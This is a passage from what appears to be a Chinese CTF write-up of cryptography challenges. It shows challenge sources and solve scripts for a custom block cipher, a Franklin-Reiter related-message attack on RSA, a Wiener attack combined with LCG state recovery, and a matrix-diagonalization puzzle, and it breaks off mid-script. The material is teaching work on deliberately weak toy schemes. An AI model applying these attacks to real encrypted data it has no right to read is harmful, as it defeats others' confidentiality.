&lt; c2 <span class="keyword">else</span> c1 <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(d)]</span><br><span class="line">    b = [<span class="string">&#x27;&#x27;</span>] * d</span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    maxlen = c1 + <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(maxlen):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(d):</span><br><span class="line">            <span class="keyword">if</span> j &lt; lengths[k]:</span><br><span class="line">                b[k] += c_bits[idx]</span><br><span class="line">                idx += <span class="number">1</span></span><br><span class="line">    a_bits = <span class="string">&#x27;&#x27;</span>.join(b)</span><br><span class="line">    a_bits = a_bits.zfill(<span class="number">32</span>)</span><br><span class="line">    <span class="keyword">return</span> a_bits</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inverse_bit_permute_word</span>(<span class="params">word_bytes, i</span>):</span><br><span class="line">    c_int = <span class="built_in">int</span>.from_bytes(<span class="built_in">bytes</span>(word_bytes), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    c_bits = <span class="built_in">bin</span>(c_int)[<span class="number">2</span>:].zfill(<span class="number">32</span>)</span><br><span class="line">    a_bits = bit_perm_inverse_for_i(c_bits, i)</span><br><span class="line">    a_int = <span class="built_in">int</span>(a_bits, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> [(a_int &gt;&gt; (<span class="number">8</span>*j)) &amp; <span class="number">0xff</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inverse_linear_mix</span>(<span class="params">m_bytes</span>):</span><br><span class="line">    A = [[m_bytes[<span class="number">4</span>*i + j] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">    temp = [[<span class="built_in">sum</span>(B_inv[i][k] * A[k][j] <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)) % <span class="number">256</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">    M = [[temp[j][i] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            out.append(M[j][k])</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_block</span>(<span class="params">cipher_block: <span class="built_in">bytes</span>, ks_bytes: <span class="built_in">bytes</span>, iv: <span class="built_in">bytes</span></span>):</span><br><span class="line">    m = <span class="built_in">list</span>(cipher_block)</span><br><span class="line">    <span class="keyword">for</span> loop <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(<span class="number">16</span>)):</span><br><span class="line">        rk = ks_bytes[<span class="number">4</span>*(loop+<span class="number">1</span>)*<span class="number">4</span> : <span class="number">4</span>*(loop+<span class="number">2</span>)*<span class="number">4</span>]</span><br><span class="line">        m = <span class="built_in">list</span>(x ^ y <span class="keyword">for</span> x,y <span class="keyword">in</span> <span class="built_in">zip</span>(m, rk))</span><br><span class="line">        <span class="keyword">if</span> loop &lt; <span class="number">15</span>:</span><br><span class="line">            m = inverse_linear_mix(m)</span><br><span class="line">        out = [<span class="number">0</span>]*<span class="number">16</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            chunk = m[<span class="number">4</span>*i:<span class="number">4</span>*i+<span class="number">4</span>]</span><br><span class="line">            recovered = inverse_bit_permute_word(chunk, i)</span><br><span class="line">            out[<span class="number">4</span>*i:<span class="number">4</span>*i+<span class="number">4</span>] = recovered</span><br><span class="line">        m = out</span><br><span class="line">        m = [inv_sbox[x] <span class="keyword">for</span> x <span class="keyword">in</span> m]</span><br><span class="line">    k0 = ks_bytes[:<span class="number">16</span>]</span><br><span class="line">    m = <span class="built_in">bytes</span>(m)</span><br><span class="line">    m = xor_bytes(m, k0)</span><br><span class="line">    m = xor_bytes(m, iv)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_ks</span>(<span class="params">key: <span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(key) == <span class="number">16</span></span><br><span class="line">    ks = [key[:<span class="number">4</span>], key[<span class="number">4</span>:<span class="number">8</span>], key[<span class="number">8</span>:<span class="number">12</span>], key[<span class="number">12</span>:<span class="number">16</span>]]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>*<span class="number">4</span>):</span><br><span class="line">        nk = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            nk = <span class="built_in">int</span>.from_bytes(ks[i+j],<span class="string">&#x27;big&#x27;</span>) ^ (<span class="number">3377808869</span> * nk % (<span class="number">1</span>&lt;&lt;<span class="number">32</span>))</span><br><span class="line">        ks.append(nk.to_bytes(<span class="number">4</span>,<span class="string">&#x27;little&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> ks</span><br><span class="line"></span><br><span class="line">what = <span class="string">b&#x27;www.bilibili.com/video/BV1ox4y1e71S&#x27;</span></span><br><span class="line">key = what[:<span class="number">16</span>]</span><br><span class="line">iv = what[-<span class="number">16</span>:]</span><br><span class="line">cipher_hex = <span class="string">&quot;aa624dc4a26a879cbdc61585e1c92650d5d84c9195508d73172008e3bf1cf6edfa5eb1d1590b0de1424a563c91aeb5d8&quot;</span></span><br><span class="line">cipher = <span class="built_in">bytes</span>.fromhex(cipher_hex)</span><br><span class="line"></span><br><span class="line">ks = build_ks(key)</span><br><span class="line">ks_bytes = <span class="string">b&#x27;&#x27;</span>.join(ks)</span><br><span class="line"></span><br><span class="line">plaintext = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">cur_iv = iv</span><br><span class="line"><span class="keyword">for</span> b_i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)//<span class="number">16</span>):</span><br><span class="line">    cb = cipher[<span class="number">16</span>*b_i:<span class="number">16</span>*(b_i+<span class="number">1</span>)]</span><br><span class="line">    pt_block = decrypt_block(cb, ks_bytes, cur_iv)</span><br><span class="line">    plaintext += pt_block</span><br><span class="line">    cur_iv = cb</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Recovered (raw):&quot;</span>, plaintext)</span><br><span class="line">pad_len = plaintext[-<span class="number">1</span>]</span><br><span class="line">recovered = plaintext.rstrip(<span class="built_in">bytes</span>([pad_len]))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Recovered (flag):&quot;</span>, recovered.decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Week3-粗心的刀客塔"><a href="#Week3-粗心的刀客塔" class="headerlink" title="[Week3] 粗心的刀客塔"></a>[Week3] 粗心的刀客塔</h2><p>源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>([<span class="number">32</span> &lt;= i &lt; <span class="number">127</span> <span class="keyword">for</span> i <span class="keyword">in</span> flag])</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">q = getPrime(<span class="number">256</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">101</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">leak = <span class="built_in">pow</span>(m &gt;&gt; <span class="number">24</span>, e, n)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;leak = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 5319759096723652571836298314092909425332276330129217992231327360001696558642842980078588366780616703371535091144295605553702964868429848031926900306865671</span></span><br><span class="line"><span class="string">c = 3717882894420559435813465358856850403021712120763789421125900019613990660689611255039234186741155362666920022619737448037936794899828659821462858212688117</span></span><br><span class="line"><span class="string">leak = 3356367618122038581666224258476706455260507506246200407627535289360900935914902732942530539610398553583623134561351595796155927323645129738755588757636775</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>根据题目，可以发现两次RSA的m存在相关，可以使用Franklin-Reiter attack攻击</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">franklinReiter</span>(<span class="params">n,e,c1,c2,a,b</span>):</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = (x)^e - c1</span><br><span class="line">    g2 = (a*x+b)^e - c2</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">g1, g2</span>):</span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic() <span class="comment">#</span></span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">5319759096723652571836298314092909425332276330129217992231327360001696558642842980078588366780616703371535091144295605553702964868429848031926900306865671</span></span><br><span class="line">c = <span class="number">3717882894420559435813465358856850403021712120763789421125900019613990660689611255039234186741155362666920022619737448037936794899828659821462858212688117</span></span><br><span class="line">leak = <span class="number">3356367618122038581666224258476706455260507506246200407627535289360900935914902732942530539610398553583623134561351595796155927323645129738755588757636775</span></span><br><span class="line">e = <span class="number">101</span></span><br><span class="line">a = <span class="number">2</span>**<span class="number">24</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        tmp = [i,j,<span class="built_in">ord</span>(<span class="string">b&#x27;&#125;&#x27;</span>)]</span><br><span class="line">        b = bytes_to_long(<span class="built_in">bytes</span>(tmp))</span><br><span class="line">        m=franklinReiter(n,e,leak,c,a,b)</span><br><span class="line">        <span class="comment"># print(i,j,m)</span></span><br><span class="line">        flag = long_to_bytes(<span class="built_in">int</span>(m)) + <span class="built_in">bytes</span>(tmp)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;Franklin-Reiter_Re1at3d_Mes5age_4t7ack!!&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="Week3-my-crypto"><a href="#Week3-my-crypto" class="headerlink" title="[Week3] my crypto"></a>[Week3] my crypto</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> keys, flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>([isPrime(i) <span class="keyword">for</span> i <span class="keyword">in</span> keys])</span><br><span class="line"></span><br><span class="line">a, b, c, d = keys</span><br><span class="line">flag1 = flag[:<span class="number">16</span>]</span><br><span class="line">flag2 = flag[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getrandbits</span>(<span class="params">nbits</span>):</span><br><span class="line">    <span class="keyword">global</span> a</span><br><span class="line">    a = (a * b + c) % d</span><br><span class="line">    res = a % (<span class="number">1</span> &lt;&lt; (nbits % <span class="number">32</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbits&gt;&gt;<span class="number">5</span>):</span><br><span class="line">        a = (a * b + c) % d</span><br><span class="line">        res = (res &lt;&lt; <span class="number">32</span>) + a</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_getPrime</span>(<span class="params">nbits</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        p = getrandbits(nbits)</span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">k = <span class="string">b&#x27;&#x27;</span>.join([long_to_bytes(i) <span class="keyword">for</span> i <span class="keyword">in</span> keys])</span><br><span class="line">cipher = AES.new(k,AES.MODE_ECB)</span><br><span class="line">c1 = cipher.encrypt(flag1)</span><br><span class="line"><span class="built_in">print</span>(c1.<span class="built_in">hex</span>())</span><br><span class="line"><span class="comment"># b7a6aa2e92065c6ca0f641774daa6be7</span></span><br><span class="line"></span><br><span class="line">p = my_getPrime(<span class="number">512</span>)</span><br><span class="line">q = my_getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">d = my_getPrime(<span class="number">32</span>)</span><br><span class="line">e = <span class="built_in">pow</span>(d, -<span class="number">1</span>, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = bytes_to_long(flag2)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;e = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c2 = &#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 39521475492289704282372525102972047379587840152013494470666852310331219291229208591000963814677764705955186438589918888274349774598692589176268070208523156377103733621601248281862395731517581489150077786717418872307181541771338480999536362215017952642244625691695528497541971443123302436608607181914055505741</span></span><br><span class="line"><span class="string">e = 7955513459152363268059840496494977557672738094181109251050578837682469226136272312849884305606261787301500849415590869242112403147213286640778349227496752834593098213663381614398567765645828510773121349727282854101784391919639313881329783371319494396861363593554624562376428895567450313204953233612089862521</span></span><br><span class="line"><span class="string">c2 = 15135904127082975691707919892721484099170628305919121178457832462589237864977181629204990864942371124996446718162196996063156337665323522280326791289049051253208803267775994659805299489492829266234756958872207120589419603462407325635086273526492385436072038464980762567211324129542601948720119324910582929057</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先使用维纳攻击求出p、q和第二段flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">transform</span>(<span class="params">x, y</span>):  <span class="comment"># 使用辗转相处将分数 x/y 转为连分数的形式</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        res.append(x // y)</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">continued_fraction</span>(<span class="params">sub_res</span>):</span><br><span class="line">    numerator, denominator = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> sub_res[::-<span class="number">1</span>]:  <span class="comment"># 从sublist的后面往前循环</span></span><br><span class="line">        denominator, numerator = numerator, i * numerator + denominator</span><br><span class="line">    <span class="keyword">return</span> denominator, numerator  <span class="comment"># 得到渐进分数的分母和分子，并返回</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 求解每个渐进分数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_fraction</span>(<span class="params">x, y</span>):</span><br><span class="line">    res = transform(x, y)</span><br><span class="line">    res = <span class="built_in">list</span>(<span class="built_in">map</span>(continued_fraction, (res[<span class="number">0</span>:i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(res)))))  <span class="comment"># 将连分数的结果逐一截取以求渐进分数</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pq</span>(<span class="params">a, b, c</span>):  <span class="comment"># 由p+q和pq的值通过维达定理来求解p和q</span></span><br><span class="line">    par = gmpy2.isqrt(b * b - <span class="number">4</span> * a * c)  <span class="comment"># 由上述可得，开根号一定是整数，因为有解</span></span><br><span class="line">    x1, x2 = (-b + par) // (<span class="number">2</span> * a), (-b - par) // (<span class="number">2</span> * a)</span><br><span class="line">    <span class="keyword">return</span> x1, x2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wienerAttack</span>(<span class="params">e, n</span>):</span><br><span class="line">    <span class="keyword">for</span> (d, k) <span class="keyword">in</span> sub_fraction(e, n):  <span class="comment"># 用一个for循环来注意试探e/n的连续函数的渐进分数，直到找到一个满足条件的渐进分数</span></span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span>:  <span class="comment"># 可能会出现连分数的第一个为0的情况，排除</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (e * d - <span class="number">1</span>) % k != <span class="number">0</span>:  <span class="comment"># ed=1 (mod φ(n)) 因此如果找到了d的话，(ed-1)会整除φ(n),也就是存在k使得(e*d-1)//k=φ(n)</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        phi = (e * d - <span class="number">1</span>) // k  <span class="comment"># 这个结果就是 φ(n)</span></span><br><span class="line">        px, qy = get_pq(<span class="number">1</span>, n - phi + <span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> px * qy == n:</span><br><span class="line">            p, q = <span class="built_in">abs</span>(<span class="built_in">int</span>(px)), <span class="built_in">abs</span>(<span class="built_in">int</span>(qy))  <span class="comment"># 可能会得到两个负数，负负得正未尝不会出现</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;p =&quot;</span>,p)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;q =&quot;</span>,q)</span><br><span class="line">            d = gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))  <span class="comment"># 求ed=1 (mod  φ(n))的结果，也就是e关于 φ(n)的乘法逆元d</span></span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;该方法不适用&quot;</span>)</span><br><span class="line"></span><br><span class="line">n = <span class="number">39521475492289704282372525102972047379587840152013494470666852310331219291229208591000963814677764705955186438589918888274349774598692589176268070208523156377103733621601248281862395731517581489150077786717418872307181541771338480999536362215017952642244625691695528497541971443123302436608607181914055505741</span></span><br><span class="line">e = <span class="number">7955513459152363268059840496494977557672738094181109251050578837682469226136272312849884305606261787301500849415590869242112403147213286640778349227496752834593098213663381614398567765645828510773121349727282854101784391919639313881329783371319494396861363593554624562376428895567450313204953233612089862521</span></span><br><span class="line">c = <span class="number">15135904127082975691707919892721484099170628305919121178457832462589237864977181629204990864942371124996446718162196996063156337665323522280326791289049051253208803267775994659805299489492829266234756958872207120589419603462407325635086273526492385436072038464980762567211324129542601948720119324910582929057</span></span><br><span class="line">d = wienerAttack(e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;d =&quot;</span>,d)</span><br><span class="line">m=<span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p = 5600014191532800488531831668395799541204315609245207958128442807909500183163545047188686852245188260597387171558644084932317706911269223090409172866640439</span></span><br><span class="line"><span class="string">q = 7057388453058926233500293184792665049465132321705130378797563205430167401000382627642421543266294746401018372443611315368731148969189356088513969419966619</span></span><br><span class="line"><span class="string">d = 3530426429</span></span><br><span class="line"><span class="string">b&#x27;a_cryp7o_5ecure_PRNG&#125;&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>接着是LCG，拆分p可以得到多组连续的结果，然后求出b,c,d</p>
<p>需要注意，keys里面的值都是素数，直接求出来的b并非素数，可以知道真正的b应该是<code>b+d</code></p>
<p>最后一直倒推a的值，直到解出flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> GCD, isPrime, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">p = <span class="number">5600014191532800488531831668395799541204315609245207958128442807909500183163545047188686852245188260597387171558644084932317706911269223090409172866640439</span></span><br><span class="line">q = <span class="number">7057388453058926233500293184792665049465132321705130378797563205430167401000382627642421543266294746401018372443611315368731148969189356088513969419966619</span></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    res += [p%<span class="number">2</span>**<span class="number">32</span>]</span><br><span class="line">    p = p &gt;&gt; <span class="number">32</span></span><br><span class="line"></span><br><span class="line">c = res[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">t=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(c)):</span><br><span class="line">    t.append(c[i]-c[i-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">d = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(t)-<span class="number">1</span>):</span><br><span class="line">    d = GCD(t[i+<span class="number">1</span>]*t[i-<span class="number">1</span>]-t[i]**<span class="number">2</span>, d)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">b = (c[<span class="number">4</span>]-c[<span class="number">3</span>])*gmpy2.invert(c[<span class="number">3</span>]-c[<span class="number">2</span>],d) % d</span><br><span class="line">cc = (c[<span class="number">2</span>]-b*c[<span class="number">1</span>]) % d</span><br><span class="line"><span class="comment"># print(gmpy2.gcd(a,m))</span></span><br><span class="line"><span class="comment"># print(gmpy2.gcd(b,m))</span></span><br><span class="line">b_1=gmpy2.invert(b,d)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(b,cc)</span><br><span class="line"><span class="built_in">print</span>(isPrime(b))</span><br><span class="line"><span class="built_in">print</span>(isPrime(b+d))</span><br><span class="line">b = b+d</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(isPrime(cc))</span><br><span class="line"><span class="built_in">print</span>(isPrime(d))</span><br><span class="line">a = c[<span class="number">1</span>]</span><br><span class="line">enc = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;b7a6aa2e92065c6ca0f641774daa6be7&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    a = (a-cc) * b_1 % d</span><br><span class="line">    keys = [a,b,cc,d]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        k = <span class="string">b&#x27;&#x27;</span>.join([long_to_bytes(i) <span class="keyword">for</span> i <span class="keyword">in</span> keys])</span><br><span class="line">        cipher = AES.new(k,AES.MODE_ECB)</span><br><span class="line">        flag = cipher.decrypt(enc)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;LCG_is_n0t_&#x27;</span></span><br></pre></td></tr></table></figure>

<p>flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;LCG_is_n0t_a_cryp7o_5ecure_PRNG&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Week3-期末考试"><a href="#Week3-期末考试" class="headerlink" title="[Week3] 期末考试"></a>[Week3] 期末考试</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> B, C</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">p = <span class="number">251</span></span><br><span class="line">A = np.diag([np.random.randint(<span class="number">0</span>,p) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)])</span><br><span class="line"></span><br><span class="line">B = np.matrix(B)</span><br><span class="line">C = np.matrix(C)</span><br><span class="line"><span class="built_in">print</span>(B * C %p)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[[1 0 0 0 0 0]</span></span><br><span class="line"><span class="string"> [0 1 0 0 0 0]</span></span><br><span class="line"><span class="string"> [0 0 1 0 0 0]</span></span><br><span class="line"><span class="string"> [0 0 0 1 0 0]</span></span><br><span class="line"><span class="string"> [0 0 0 0 1 0]</span></span><br><span class="line"><span class="string"> [0 0 0 0 0 1]]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">D = B * A * C %p</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;D =&#x27;</span>,D.tolist())</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">D = [[221, 145, 242, 96, 133, 32], [79, 42, 48, 69, 127, 19], [222, 112, 115, 170, 108, 76], [112, 122, 165, 137, 67, 164], [29, 148, 80, 173, 33, 72], [92, 101, 143, 18, 14, 109]]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">bytes</span>(B.reshape((<span class="number">1</span>,<span class="number">36</span>)).tolist()[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">4</span>] == <span class="string">b&#x27;flag&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;you_need_to_solve_by_yourself!&#125;&#x27; ## fakeflag</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>主要考察矩阵相似、特征值和对角化</p>
<p>AI梭了（</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Sage script to recover B and the flag from the given D over GF(251)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations, product</span><br><span class="line"></span><br><span class="line">p = <span class="number">251</span></span><br><span class="line">F = GF(p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知矩阵 D（题目中给出）</span></span><br><span class="line">D_list = [</span><br><span class="line">    [<span class="number">221</span>, <span class="number">145</span>, <span class="number">242</span>, <span class="number">96</span>, <span class="number">133</span>, <span class="number">32</span>],</span><br><span class="line">    [<span class="number">79</span>, <span class="number">42</span>, <span class="number">48</span>, <span class="number">69</span>, <span class="number">127</span>, <span class="number">19</span>],</span><br><span class="line">    [<span class="number">222</span>, <span class="number">112</span>, <span class="number">115</span>, <span class="number">170</span>, <span class="number">108</span>, <span 